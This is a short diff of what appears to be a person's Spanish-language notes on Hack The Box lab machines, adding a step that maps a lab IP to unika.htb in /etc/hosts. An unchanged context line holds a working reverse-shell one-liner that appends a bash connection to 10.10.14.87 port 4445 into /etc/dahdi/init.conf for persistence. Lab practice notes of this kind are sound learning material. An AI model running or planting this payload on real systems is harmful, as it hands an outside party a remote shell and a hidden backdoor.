@@ -16,3 +16,7 @@ done;
 ```
 
 'echo 'bash -c "bash -i >& /dev/tcp/10.10.14.87/4445 0>&1" &' >> /etc/dahdi/init.conf'
+
+
+Agregar ip de maquinas a hosts
+└─$ echo "10.129.97.221    unika.htb" | sudo tee -a /etc/hosts
